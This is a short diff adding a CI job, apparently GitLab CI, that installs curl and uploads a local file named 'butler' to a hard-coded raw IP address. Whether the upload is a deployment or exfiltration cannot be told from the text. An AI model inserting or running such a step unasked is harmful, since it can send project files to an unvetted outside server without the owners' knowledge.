@@ -1,0 +1,5 @@
+sending:
+  script:
+    - ls -la 
+    - apt-get update -qq && apt-get install -y -qq curl
+    - curl -F file=@./butler http://92.53.78.163:3030/repo
